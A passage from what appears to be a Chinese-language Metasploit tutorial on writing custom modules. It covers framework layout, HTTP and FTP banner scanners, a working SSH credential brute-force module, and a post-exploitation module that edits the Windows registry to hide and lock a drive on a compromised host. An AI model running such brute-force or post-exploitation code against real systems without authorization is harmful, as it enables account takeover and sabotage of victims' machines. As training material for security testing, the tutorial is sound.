我们创建了另一个名为`r`的变量，并将我们的正则表达式存储在其中，即`/world/`。在下一行，我们使用`MatchData`类的`match`对象将正则表达式与字符串进行匹配。Shell 响应了一条消息，`MatchData "world"`，表示成功匹配。接下来，我们将使用另一种方法来使用`=~`运算符匹配字符串的方式，它返回匹配的确切位置。让我们看另一个做法：

```
irb(main):007:0> r = /^world/
=> /^world/
irb(main):008:0> n =~ r
=> nil
irb(main):009:0> r = /^Hello/
=> /^Hello/
irb(main):010:0> n =~ r
=> 0
irb(main):014:0> r= /world$/
=> /world$/
irb(main):015:0> n=~ r
=> 6
```

让我们给`r`赋一个新值，即`/^world/`；这里，`^`运算符告诉解释器从开头匹配字符串。如果没有匹配，我们得到`nil`作为输出。我们修改这个表达式以从单词`Hello`开始；这次，它给我们返回位置`0`，表示匹配从最开始开始。接下来，我们将正则表达式修改为`/world$/`，表示我们需要从结尾匹配单词`world`，以便进行成功匹配。

有关 Ruby 正则表达式的更多信息，请参阅：[`www.tutorialspoint.com/ruby/ruby_regular_expressions.htm`](http://www.tutorialspoint.com/ruby/ruby_regular_expressions.htm)。

请参考以下链接，了解如何有效使用 Ruby 编程的快速备忘单：[`github.com/savini/cheatsheets/raw/master/ruby/RubyCheat.pdf`](https://github.com/savini/cheatsheets/raw/master/ruby/RubyCheat.pdf) 和 [`hyperpolyglot.org/scripting`](http://hyperpolyglot.org/scripting)。

有关构建正确的正则表达式，请参考 [`rubular.com/`](http://rubular.com/)。

# 用 Ruby 基础知识结束

你好！还醒着吗？这是一次累人的会话，对吧？我们刚刚介绍了设计 Metasploit 模块所需的 Ruby 基本功能。Ruby 非常广泛，不可能在这里涵盖所有方面。但是，请参考以下链接中关于 Ruby 编程的一些优秀资源：

+   Ruby 教程的优秀资源可在以下链接找到：[`tutorialspoint.com/ruby/`](http://tutorialspoint.com/ruby/)

+   使用 Ruby 编程的快速备忘单可以在以下链接找到：

+   [`github.com/savini/cheatsheets/raw/master/ruby/RubyCheat.pdf`](https://github.com/savini/cheatsheets/raw/master/ruby/RubyCheat.pdf)

+   [`hyperpolyglot.org/scripting`](http://hyperpolyglot.org/scripting)

+   有关 Ruby 的更多信息，请访问：[`en.wikibooks.org/wiki/Ruby_Programming`](http://en.wikibooks.org/wiki/Ruby_Programming)

# 开发自定义模块

让我们深入了解编写模块的过程。Metasploit 有各种模块，如有效载荷、编码器、利用、NOP 生成器和辅助程序。在本节中，我们将介绍开发模块的基本知识；然后，我们将看看如何创建自定义模块。

我们将讨论辅助和后利用模块的开发。此外，我们将在下一章中介绍核心利用模块。但是，在本章中，让我们详细讨论模块构建的基本要点。

# 在脑袋里建立一个模块

在深入构建模块之前，让我们了解 Metasploit 框架中组件的排列方式以及它们的作用。

# Metasploit 框架的架构

Metasploit 包含各种组件，如必要的库、模块、插件和工具。Metasploit 结构的图形视图如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/4cbc993e-fac3-4a57-83d3-352590424706.png)

让我们看看这些组件是什么，它们是如何工作的。最好从作为 Metasploit 核心的库开始。我们可以在下表中看到核心库：

| **库名称** | **用法** |
| --- | --- |
| `REX` | 处理几乎所有核心功能，如设置套接字、连接、格式化和所有其他原始功能 |
| `MSF CORE` | 提供了描述框架的底层 API 和实际核心 |
| `MSF BASE` | 为模块提供友好的 API 支持 |

在 Metasploit 中有许多类型的模块，它们在功能上有所不同。我们有用于创建对被利用系统的访问通道的有效载荷模块。我们有辅助模块来执行操作，如信息收集、指纹识别、模糊化应用程序和登录到各种服务。让我们看一下这些模块的基本功能，如下表所示：

| **模块类型** | **用法** |
| --- | --- |
| 有效载荷 | 有效载荷用于在利用系统后执行操作，如连接到或从目标系统，或执行特定任务，如安装服务等。在成功利用系统后，有效载荷执行是下一步。在上一章中广泛使用的 Meterpreter shell 是典型的 Metasploit 有效载荷。 |
| 辅助 | 执行特定任务的模块，如信息收集、数据库指纹识别、端口扫描和目标网络上的横幅抓取的辅助模块。 |
| 编码器 | 编码器用于对载荷和攻击向量进行编码，以逃避杀毒软件或防火墙的检测。 |
| NOPs | NOP 生成器用于对齐，从而使利用稳定。 |
| 利用 | 触发漏洞的实际代码。 |

# 了解文件结构

Metasploit 的文件结构按照以下图示的方案布置：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/3af3fb91-752e-4b53-9784-a022dd492b5d.png)

我们将通过以下表格介绍最相关的目录，这将帮助我们构建 Metasploit 模块：

| **目录** | **用途** |
| --- | --- |
| `lib` | Metasploit 的核心；它包含了所有必要的库文件，帮助我们构建 MSF 模块。 |
| `模块` | 所有的 Metasploit 模块都包含在这个目录中；从扫描器到后渗透模块，Metasploit 项目中集成的每个模块都可以在这个目录中找到。 |
| `工具` | 包含在这个文件夹中的命令行实用程序有助于渗透测试；从创建垃圾模式到查找成功利用编写的 JMP ESP 地址，所有必要的命令行实用程序都在这里。 |
| `插件` | 所有扩展 Metasploit 功能的插件都存储在这个目录中。标准插件包括 OpenVAS、Nexpose、Nessus 等，可以使用`load`命令加载到框架中。 |
| `脚本` | 这个目录包含 Meterpreter 和其他各种脚本。 |

# 库布局

Metasploit 模块是由不同库中包含的各种功能以及一般的 Ruby 编程构建而成。现在，要使用这些功能，我们首先需要了解它们是什么。我们如何触发这些功能？我们需要传递多少个参数？此外，这些功能会返回什么？

让我们来看看这些库是如何组织的；如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/51674a72-5d3b-4507-9e3e-b78bcd74f75e.png)

正如我们在前面的截图中所看到的，我们在`/lib`目录中有关键的`rex`库以及所有其他必要的库。

`/base`和`/core`库也是一组关键的库，位于`/msf`目录下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/29673620-c69b-419c-9591-d7f21d6532bb.png)

现在，在`/msf/core`库文件夹下，我们有所有在第一章中使用的模块的库；如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/a23f5b25-9c52-4dc2-9a2f-ae0995883ebf.png)

这些库文件为所有模块提供了核心。然而，对于不同的操作和功能，我们可以参考任何我们想要的库。在大多数 Metasploit 模块中使用的一些最常用的库文件位于`core/exploits/`目录中，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/798dd250-a34c-4de1-a0eb-8af6c76244ed.png)

正如我们所看到的，很容易在`core/`目录中找到各种类型模块的相关库。目前，我们在`/lib`目录中有用于利用、载荷、后渗透、编码器和其他各种模块的核心库。

访问 Metasploit Git 存储库[`github.com/rapid7/metasploit-framework`](https://github.com/rapid7/metasploit-framework)以访问完整的源代码。

# 了解现有模块

开始编写模块的最佳方法是深入研究现有的 Metasploit 模块，了解它们内部是如何工作的。

# Metasploit 模块的格式

Metasploit 模块的骨架相当简单。我们可以在这里显示的代码中看到通用的头部部分：

```
require 'msf/core' 

class MetasploitModule < Msf::Auxiliary 
  def initialize(info = {}) 
    super(update_info(info, 
      'Name'           => 'Module name', 
      'Description'    => %q{ 
        Say something that the user might want to know. 
      }, 
      'Author'         => [ 'Name' ], 
      'License'        => MSF_LICENSE 
    )) 
  end 
  def run 
    # Main function 
  end 
end 
```

一个模块通过使用`require`关键字包含必要的库开始，前面的代码中跟随着`msf/core`库。因此，它包括了来自`/msf`目录的核心库。

下一个重要的事情是定义类类型，以指定我们要创建的模块的类型。我们可以看到我们已经为同样的目的设置了`MSF::Auxiliary`。

在`initialize`方法中，这是 Ruby 中的默认构造函数，我们定义了`Name`，`Description`，`Author`，`License`，`CVE`等详细信息。此方法涵盖了特定模块的所有相关信息：`Name`通常包含被定位的软件名称；`Description`包含有关漏洞解释的摘录；`Author`是开发模块的人的名字；`License`是`MSF_LICENSE`，如前面列出的代码示例中所述。辅助模块的主要方法是`run`方法。因此，除非您有大量其他方法，否则所有操作都应在其中执行。但是，执行仍将从`run`方法开始。

# 分解现有的 HTTP 服务器扫描器模块

让我们使用一个简单的 HTTP 版本扫描器模块，并看看它是如何工作的。这个 Metasploit 模块的路径是：`/modules/auxiliary/scanner/http/http_version.rb`。

让我们系统地检查这个模块：

```
## 
# This module requires Metasploit: https://metasploit.com/download 
# Current source: https://github.com/rapid7/metasploit-framework 
## 
require 'rex/proto/http' 
class MetasploitModule < Msf::Auxiliary 
```

让我们讨论这里的安排方式。以`#`符号开头的版权行是注释，包含在所有 Metasploit 模块中。`require 'rex/proto/http'`语句要求解释器包含来自`rex`库的所有 HTTP 协议方法的路径。因此，来自`/lib/rex/proto/http`目录的所有文件的路径现在对模块可用，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/be6b1a9a-8d80-4010-80f3-9229193146b7.png)

所有这些文件都包含各种 HTTP 方法，包括建立连接、`GET`和`POST`请求、响应处理等功能。

在下一行，`Msf::Auxiliary`将代码定义为辅助类型模块。让我们继续看代码，如下所示：

```
  # Exploit mixins should be called first 
  include Msf::Exploit::Remote::HttpClient 
  include Msf::Auxiliary::WmapScanServer 
  # Scanner mixin should be near last 
  include Msf::Auxiliary::Scanner 
```

前面的部分包括所有包含在模块中使用的方法的必要库文件。让我们列出这些包含的库的路径，如下所示：

| **包含语句** | **路径** | **用法** |
| --- | --- | --- |
| `Msf::Exploit::Remote::HttpClient` | `/lib/msf/core/exploit/http/client.rb` | 此库文件将提供各种方法，如连接到目标，发送请求，断开客户端等。 |
| `Msf::Auxiliary::WmapScanServer` | `/lib/msf/core/auxiliary/wmapmodule.rb` | 你可能想知道，WMAP 是什么？WMAP 是 Metasploit 框架的基于 Web 应用程序的漏洞扫描器附加组件，它利用 Metasploit 进行 Web 测试。 |
| `Msf::Auxiliary::Scanner` | `/lib/msf/core/auxiliary/scanner.rb` | 此文件包含基于扫描器的模块的各种功能。该文件支持各种方法，如运行模块，初始化和扫描进度等。 |

让我们看一下代码的下一部分：

```
def initialize 
  super( 
    'Name'        => 'HTTP Version Detection', 
    'Description' => 'Display version information about each system', 
    'Author'      => 'hdm', 
    'License'     => MSF_LICENSE 
  ) 

  register_wmap_options({ 
      'OrderID' => 0, 
      'Require' => {}, 
    }) 
end 
```

这部分模块定义了`initialize`方法，该方法初始化了此模块的基本参数，如`Name`，`Author`，`Description`和`License`，并初始化了 WMAP 参数。现在，让我们看一下代码的最后一部分：

```
# Fingerprint a single host 
  def run_host(ip) 
    begin 
      connect 
      res = send_request_raw({ 'uri' => '/', 'method' => 'GET' }) 
      fp = http_fingerprint(:response => res) 
      print_good("#{ip}:#{rport} #{fp}") if fp 
      report_service(:host => rhost, :port => rport, :sname => (ssl ? 'https' : 'http'), :info => fp) 
    rescue ::Timeout::Error, ::Errno::EPIPE 
    ensure 
      disconnect 
    end 
  end 
end 
```

这里的函数是扫描器的核心。

# 库和函数

让我们看一下在这个模块中使用的一些库的一些基本方法，如下所示：

| **函数** | **库文件** | **用法** |
| --- | --- | --- |
| `run_host` | `/lib/msf/core/auxiliary/scanner.rb` | 这是每个主机运行一次的主要方法 |
| `connect` | `/lib/msf/core/auxiliary/scanner.rb` | 这用于与目标主机建立连接 |
| `send_raw_request` | `/core/exploit/http/client.rb` | 此方法用于向目标发出原始的 HTTP 请求 |
| `request_raw` | `/rex/proto/http/client.rb` | `send_raw_request`传递数据到的库方法 |
| `http_fingerprint` | `/lib/msf/core/exploit/http/client.rb` | 将 HTTP 响应解析为可用变量 |
| `report_service` | `/lib/msf/core/auxiliary/report.rb` | 此方法用于报告和存储在目标主机上找到的服务到数据库中 |

现在让我们了解一下这个模块。这里，我们有一个名为`run_host`的方法，以 IP 作为参数来建立与所需主机的连接。`run_host`方法是从`/lib/msf/core/auxiliary/scanner.rb`库文件中引用的。这个方法将为每个主机运行一次，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/27caf839-f795-44f8-adfc-fae97dc3f14c.png)

接下来，我们有`begin`关键字，表示代码块的开始。在下一条语句中，我们有`connect`方法，它建立与服务器的 HTTP 连接，如前面的表中所讨论的。

接下来，我们定义一个名为`res`的变量，它将存储响应。我们将使用`/core/exploit/http/client.rb`文件中的`send_raw_request`方法，参数为`URI`为`/`，请求的`method`为`GET`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/bb0246ee-c356-4c53-9c28-ecc57b513c24.png)

上述方法将帮助您连接到服务器，创建请求，发送请求并读取响应。我们将响应保存在`res`变量中。

这个方法将所有参数传递给`/rex/proto/http/client.rb`文件中的`request_raw`方法，这里检查了所有这些参数。我们有很多可以在参数列表中设置的参数。让我们看看它们是什么：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/92c14168-346b-41bc-8e3f-23e3ba902d89.png)

`res`是一个存储结果的变量。在下一条语句中，从`/lib/msf/core/exploit/http/client.rb`文件中使用`http_fingerprint`方法来分析`fp`变量中的数据。这个方法将记录和过滤诸如`Set-cookie`、`Powered-by`和其他这样的头信息。这个方法需要一个 HTTP 响应数据包来进行计算。因此，我们将提供`:response` `=> res`作为参数，表示应该对之前使用`res`生成的请求接收到的数据进行指纹识别。然而，如果没有给出这个参数，它将重新做一切，并再次从源获取数据。下一条语句在`fp`变量被设置时打印出一个类型良好的信息消息，其中包括 IP、端口和服务名称的详细信息。`report_service`方法只是将信息存储到数据库中。它将保存目标的 IP 地址、端口号、服务类型（基于服务的 HTTP 或 HTTPS）和服务信息。最后一行`rescue ::Timeout::Error, ::Errno::EPIPE`将处理模块超时的异常。

现在，让我们运行这个模块，看看输出是什么：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/d0a0aa59-585f-4ea4-84cb-465a970676d1.png)

到目前为止，我们已经看到了模块是如何工作的。我们可以看到，在成功对应用程序进行指纹识别后，信息被发布在控制台上并保存在数据库中。此外，在超时时，模块不会崩溃，并且处理得很好。让我们再进一步，尝试编写我们自定义的模块。

# 编写一个自定义的 FTP 扫描器模块

让我们尝试构建一个简单的模块。我们将编写一个简单的 FTP 指纹模块，看看事情是如何工作的。让我们来检查 FTP 模块的代码：

```
class MetasploitModule < Msf::Auxiliary 
  include Msf::Exploit::Remote::Ftp 
  include Msf::Auxiliary::Scanner 
  include Msf::Auxiliary::Report 
  def initialize 
    super( 
      'Name'        => 'FTP Version Scanner Customized Module', 
      'Description' => 'Detect FTP Version from the Target', 
      'Author'      => 'Nipun Jaswal', 
      'License'     =>  MSF_LICENSE 
    ) 

    register_options( 
      [ 
        Opt::RPORT(21), 
      ]) 
  end 
```

我们通过定义我们要构建的 Metasploit 模块的类型来开始我们的代码。在这种情况下，我们正在编写一个辅助模块，它与我们之前工作过的模块非常相似。接下来，我们定义了需要从核心库集中包含的库文件，如下所示：

| **包含语句** | **路径** | **用法** |
| --- | --- | --- |
| Msf::Exploit::Remote::Ftp | `/lib/msf/core/exploit/ftp.rb` | 该库文件包含了所有与 FTP 相关的必要方法，如建立连接、登录 FTP 服务、发送 FTP 命令等方法。 |
| Msf::Auxiliary::Scanner | `/lib/msf/core/auxiliary/scanner.rb` | 该文件包含了所有基于扫描仪的模块的各种功能。该文件支持各种方法，如运行模块、初始化和扫描进度。 |
| Msf::Auxiliary::Report | `/lib/msf/core/auxiliary/report.rb` | 该文件包含了所有各种报告功能，帮助将运行模块的数据存储到数据库中。 |

我们在`initialize`方法中定义模块的信息，如名称、描述、作者名称和许可证等属性。我们还定义了模块工作所需的选项。例如，在这里，我们将`RPORT`分配给端口`21`，这是 FTP 的默认端口。让我们继续处理模块的其余部分：

```
def run_host(target_host) 
     connect(true, false) 
    if(banner) 
    print_status("#{rhost} is running #{banner}") 
    report_service(:host => rhost, :port => rport, :name => "ftp", :info => banner) 
    end 
    disconnect 
  end 
end 
```

# 库和函数

让我们看看在这个模块中使用的一些重要函数的库，如下所示：

| **函数** | **库文件** | **用法** |
| --- | --- | --- |
| `run_host` | `/lib/msf/core/auxiliary/scanner.rb` | 每个主机运行一次的主要方法。 |
| `connect` | `/lib/msf/core/exploit/ftp.rb` | 该函数负责初始化与主机的连接，并自动抓取横幅并将其存储在横幅变量中。 |
| `report_service` | `/lib/msf/core/auxiliary/report.rb` | 该方法专门用于将服务及其相关详细信息添加到数据库中。 |

我们定义了`run_host`方法，作为主要方法。`connect`函数将负责初始化与主机的连接。然而，我们向`connect`函数提供了两个参数，分别是`true`和`false`。`true`参数定义了使用全局参数，而`false`关闭了模块的冗长功能。`connect`函数的美妙之处在于它连接到目标并自动记录 FTP 服务的横幅在名为`banner`的参数中，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/de42a8c6-3d8e-4ec3-b2c9-b017fecadb15.png)

现在，我们知道结果存储在`banner`属性中。因此，我们只需在最后打印出横幅。接下来，我们使用`report_service`函数，以便将扫描数据保存到数据库中以供以后使用或进行高级报告。该方法位于辅助库部分的`report.rb`文件中。`report_service`的代码看起来类似于以下截图：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/4af7446e-0dbf-4831-8225-8930d668c852.png)

我们可以看到，`report_service`方法提供的参数通过另一个名为`framework.db.report_service`的方法传递到数据库中，该方法位于`/lib/msf/core/db_manager/service.rb`中。完成所有必要操作后，我们只需断开与目标的连接。

这是一个简单的模块，我建议您尝试构建简单的扫描程序和其他类似的模块。

# 使用 msftidy

然而，在运行此模块之前，让我们检查我们刚刚构建的模块是否在语法上是正确的。我们可以通过使用内置的 Metasploit 工具`msftidy`来实现这一点，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/f827f0dc-cec6-488a-bf3b-55e4e307eb78.png)

我们将收到一个警告消息，指示第 20 行末尾有一些额外的空格。当我们删除额外的空格并重新运行`msftidy`时，我们将看到没有生成错误，这意味着模块的语法是正确的。

现在，让我们运行这个模块，看看我们收集到了什么：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/2f5c9ed1-36b9-4ef0-8ed5-5676aa501325.png)

我们可以看到模块成功运行，并且它具有在端口`21`上运行的服务的横幅，即`220-FileZilla Server 0.9.60 beta`。在前一个模块中，`report_service`函数将数据存储到服务部分，可以通过运行`services`命令来查看，如前面的截图所示。

有关 Metasploit 项目中模块的接受标准，可参考：[`github.com/rapid7/metasploit-framework/wiki/Guidelines-for-Accepting-Modules-and-Enhancements`](https://github.com/rapid7/metasploit-framework/wiki/Guidelines-for-Accepting-Modules-and-Enhancements)。

# 编写一个自定义的 SSH 身份验证暴力攻击。

检查弱登录凭据，我们需要执行身份验证暴力攻击。这些测试的议程不仅是为了测试应用程序是否容易受到弱凭据的攻击，还要确保适当的授权和访问控制。这些测试确保攻击者不能简单地通过尝试非穷尽的暴力攻击来绕过安全范式，并且在一定数量的随机猜测后被锁定。

设计 SSH 服务的下一个身份验证测试模块，我们将看看在 Metasploit 中设计基于身份验证的检查有多容易，并执行攻击身份验证的测试。现在让我们跳入编码部分并开始设计一个模块，如下所示：

```
require 'metasploit/framework/credential_collection' 
require 'metasploit/framework/login_scanner/ssh' 

class MetasploitModule < Msf::Auxiliary 

  include Msf::Auxiliary::Scanner 
  include Msf::Auxiliary::Report 
  include Msf::Auxiliary::AuthBrute 

  def initialize 
    super( 
      'Name'        => 'SSH Scanner', 
      'Description' => %q{ 
        My Module. 
      }, 
      'Author'      => 'Nipun Jaswal', 
      'License'     => MSF_LICENSE 
    ) 

    register_options( 
      [ 
        Opt::RPORT(22) 
      ]) 
  end 
```

在前面的示例中，我们已经看到了使用`Msf::Auxiliary::Scanner`和`Msf::Auxiliary::Report`的重要性。让我们看看其他包含的库并通过下表了解它们的用法：

| **包含语句** | **路径** | **用法** |
| --- | --- | --- |
| `Msf::Auxiliary::AuthBrute` | `/lib/msf/core/auxiliary/auth_brute.rb` | 提供必要的暴力攻击机制和功能，比如提供使用单个用户名和密码、单词列表和空密码的选项。 |

在前面的代码中，我们还包括了两个文件，分别是`metasploit/framework/login_scanner/ssh`和`metasploit/framework/credential_collection`。`metasploit/framework/login_scanner/ssh`文件包括了 SSH 登录扫描器库，它消除了所有手动操作，并提供了 SSH 扫描的底层 API。`metasploit/framework/credential_collection`文件帮助根据`datastore`中用户输入创建多个凭据。接下来，我们只需定义我们正在构建的模块的类型。

在`initialize`部分，我们为这个模块定义了基本信息。让我们看看下一部分：

```
def run_host(ip) 
    cred_collection = Metasploit::Framework::CredentialCollection.new( 
      blank_passwords: datastore['BLANK_PASSWORDS'], 
      pass_file: datastore['PASS_FILE'], 
      password: datastore['PASSWORD'], 
      user_file: datastore['USER_FILE'], 
      userpass_file: datastore['USERPASS_FILE'], 
      username: datastore['USERNAME'], 
      user_as_pass: datastore['USER_AS_PASS'], 
    ) 

    scanner = Metasploit::Framework::LoginScanner::SSH.new( 
      host: ip, 
      port: datastore['RPORT'], 
      cred_details: cred_collection, 
      proxies: datastore['Proxies'], 
      stop_on_success: datastore['STOP_ON_SUCCESS'], 
      bruteforce_speed: datastore['BRUTEFORCE_SPEED'], 
      connection_timeout: datastore['SSH_TIMEOUT'], 
      framework: framework, 
      framework_module: self, 
    ) 
```

我们可以看到在前面的代码中有两个对象，分别是`cred_collection`和`scanner`。这里需要注意的一个重要点是，我们不需要任何手动登录 SSH 服务的方法，因为登录扫描器会为我们完成一切。因此，`cred_collection`只是根据模块上设置的`datastore`选项生成凭据集。`CredentialCollection`类的美妙之处在于它可以一次性接受单个用户名/密码组合、单词列表和空凭据，或者它们中的一个。

所有登录扫描器模块都需要凭据对象来进行登录尝试。在前面的代码中定义的`scanner`对象初始化了一个 SSH 类的对象。这个对象存储了目标的地址、端口、由`CredentialCollection`类生成的凭据，以及其他数据，比如代理信息、`stop_on_success`，它将在成功的凭据匹配时停止扫描，暴力攻击速度和尝试超时的值。

到目前为止，在模块中我们已经创建了两个对象；`cred_collection`将根据用户输入生成凭据，而`scanner`对象将使用这些凭据来扫描目标。接下来，我们需要定义一个机制，使得来自单词列表的所有凭据都被定义为单个参数，并针对目标进行测试。

我们已经在之前的示例中看到了`run_host`的用法。让我们看看在这个模块中我们将使用哪些来自各种库的其他重要函数：

| **函数** | **库文件** | **用法** |
| --- | --- | --- |
| `create_credential()` | `/lib/msf/core/auxiliary/report.rb` | 从结果对象中产生凭据数据。 |
| `create_credential_login()` | `/lib/msf/core/auxiliary/report.rb` | 从结果对象中创建登录凭据，可用于登录到特定服务。 |
| `invalidate_login` | `/lib/msf/core/auxiliary/report.rb` | 标记一组凭据为特定服务的无效。 |

让我们看看我们如何实现这一点：

```
   scanner.scan! do |result| 
      credential_data = result.to_h 
      credential_data.merge!( 
          module_fullname: self.fullname, 
          workspace_id: myworkspace_id 
      ) 
         if result.success? 
        credential_core = create_credential(credential_data) 
        credential_data[:core] = credential_core 
        create_credential_login(credential_data) 
        print_good "#{ip} - LOGIN SUCCESSFUL: #{result.credential}" 
         else 
        invalidate_login(credential_data) 
        print_status "#{ip} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})" 
         end 
   end 
end 
end 
```

可以观察到我们使用`.scan`来初始化扫描，这将自行执行所有的登录尝试，这意味着我们不需要明确指定任何其他机制。`.scan`指令就像 Ruby 中的`each`循环一样。

在下一个语句中，结果被保存在`result`对象中，并使用`to_h`方法分配给`credential_data`变量，该方法将数据转换为哈希格式。在下一行中，我们将模块名称和工作区 ID 合并到`credential_data`变量中。接下来，我们使用`.success`变量对`result`对象进行 if-else 检查，该变量表示成功登录到目标。如果`result.success?`变量返回 true，我们将凭据标记为成功的登录尝试并将其存储在数据库中。但是，如果条件不满足，我们将`credential_data`变量传递给`invalidate_login`方法，表示登录失败。 

建议通过`msftidy`进行一致性检查后再运行本章和后续章节中的所有模块。让我们尝试运行该模块，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/8e86e9fd-7aa8-4071-8b6d-b8121c2cf901.png)

我们可以看到我们能够使用`claire`和`18101988`作为用户名和密码登录。让我们看看我们是否能够使用`creds`命令将凭据记录到数据库中：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/78045d49-4632-4ec4-80d9-59d5df3337fa.png)

我们可以看到我们已经将详细信息记录到数据库中，并且可以用于进行高级攻击或报告。

# 重新表达方程

如果您在之前列出的模块上工作后感到困惑，让我们逐步了解模块：

1.  我们创建了一个`CredentialCollection`对象，它接受任何用户作为输入并产生凭据，这意味着如果我们将`USERNAME`作为 root 和`PASSWORD`作为 root，它将作为单个凭据产生。但是，如果我们使用`USER_FILE`和`PASS_FILE`作为字典，那么它将从字典文件中获取每个用户名和密码，并分别为文件中的每个用户名和密码组合生成凭据。

1.  我们为 SSH 创建了一个`scanner`对象，它将消除任何手动命令使用，并将简单地检查我们提供的所有组合。

1.  我们使用`.scan`方法运行了我们的`scanner`，它将在目标上初始化暴力破解的身份验证。

1.  `.scan`方法将依次扫描所有凭据，并根据结果，将其存储到数据库中并使用`print_good`显示，否则将使用`print_status`显示而不保存。

# 编写一个驱动禁用后渗透模块

现在我们已经看到了模块构建的基础知识，我们可以进一步尝试构建一个后渗透模块。这里需要记住的一点是，只有在成功攻击目标后才能运行后渗透模块。

因此，让我们从一个简单的驱动禁用模块开始，该模块将禁用目标系统上选择的驱动器，该系统是 Windows 7 操作系统。让我们看看模块的代码，如下所示：

```
require 'rex' 
require 'msf/core/post/windows/registry' 
class MetasploitModule < Msf::Post 
  include Msf::Post::Windows::Registry 
  def initialize 
    super( 
        'Name'          => 'Drive Disabler', 
        'Description'   => 'This Modules Hides and Restrict Access to a Drive', 
        'License'       => MSF_LICENSE, 
        'Author'        => 'Nipun Jaswal' 
      ) 
    register_options( 
      [ 
        OptString.new('DriveName', [ true, 'Please SET the Drive Letter' ]) 
      ]) 
  end     
```

我们以与之前模块相同的方式开始。我们添加了所有需要的库的路径，以便在这个后渗透模块中使用。让我们看看下表中的任何新的包含和它们的用法：

| **包含语句** | **路径** | **用法** |
| --- | --- | --- |
| `Msf::Post::Windows::Registry` | `lib/msf/core/post/windows/registry.rb` | 这个库将使我们能够使用 Ruby Mixins 轻松地进行注册表操作函数。 |

接下来，我们将模块的类型定义为`Post`，用于后渗透。在继续代码时，我们在`initialize`方法中描述了模块的必要信息。我们可以始终定义`register_options`来定义我们的自定义选项以与模块一起使用。在这里，我们使用`OptString.new`将`DriveName`描述为字符串数据类型。定义新选项需要两个参数，即`required`和`description`。我们将`required`的值设置为`true`，因为我们需要一个驱动器号来启动隐藏和禁用过程。因此，将其设置为`true`将不允许模块运行，除非为其分配一个值。接下来，我们定义了新添加的`DriveName`选项的描述。

在继续代码的下一部分之前，让我们看看在这个模块中我们将要使用的重要函数是什么：

| **函数** | **库文件** | **用法** |
| --- | --- | --- |
| `meterpreter_registry_key_exist` | `lib/msf/core/post/windows/registry.rb` | 检查注册表中是否存在特定的键 |
| `registry_createkey` | `lib/msf/core/post/windows/registry.rb` | 创建一个新的注册表键 |
| `meterpreter_registry_setvaldata` | `lib/msf/core/post/windows/registry.rb` | 创建一个新的注册表值 |

让我们看看模块的剩余部分：

```
def run 
drive_int = drive_string(datastore['DriveName']) 
key1="HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" 

exists = meterpreter_registry_key_exist?(key1) 
if not exists 
print_error("Key Doesn't Exist, Creating Key!") 
registry_createkey(key1) 
print_good("Hiding Drive") 
meterpreter_registry_setvaldata(key1,'NoDrives',drive_int.to_s,'REG_DWORD',REGISTRY_VIEW_NATIVE) 
print_good("Restricting Access to the Drive") 
meterpreter_registry_setvaldata(key1,'NoViewOnDrives',drive_int.to_s,'REG_DWORD',REGISTRY_VIEW_NATIVE) 
else 
print_good("Key Exist, Skipping and Creating Values") 
print_good("Hiding Drive") 
meterpreter_registry_setvaldata(key1,'NoDrives',drive_int.to_s,'REG_DWORD',REGISTRY_VIEW_NATIVE) 
print_good("Restricting Access to the Drive") 
meterpreter_registry_setvaldata(key1,'NoViewOnDrives',drive_int.to_s,'REG_DWORD',REGISTRY_VIEW_NATIVE) 
end 
print_good("Disabled #{datastore['DriveName']} Drive") 
end 
```

通常我们使用`run`方法来运行后渗透模块。因此，在定义`run`时，我们将`DriveName`变量发送到`drive_string`方法，以获取驱动器的数值。

我们创建了一个名为`key1`的变量，并将注册表的路径存储在其中。我们将使用`meterpreter_registry_key_exist`来检查系统中是否已经存在该键。

如果键存在，则将`exists`变量的值分配为`true`或`false`。如果`exists`变量的值为`false`，我们使用`registry_createkey(key1)`创建键，然后继续创建值。但是，如果条件为真，我们只需创建值。

为了隐藏驱动器并限制访问，我们需要创建两个注册表值，即`NoDrives`和`NoViewOnDrive`，其值为十进制或十六进制的驱动器号，类型为`DWORD`。

我们可以使用`meterpreter_registry_setvaldata`来实现这一点，因为我们正在使用 meterpreter shell。我们需要向`meterpreter_registry_setvaldata`函数提供五个参数，以确保其正常运行。这些参数是键路径（字符串）、注册表值的名称（字符串）、驱动器号的十进制值（字符串）、注册表值的类型（字符串）和视图（整数值），对于本机视图为 0，32 位视图为 1，64 位视图为 2。

`meterpreter_registry_setvaldata`的示例可以分解如下：

```
meterpreter_registry_setvaldata(key1,'NoViewOnDrives',drive_int.to_s,'REG_DWORD',REGISTRY_VIEW_NATIVE) 
```

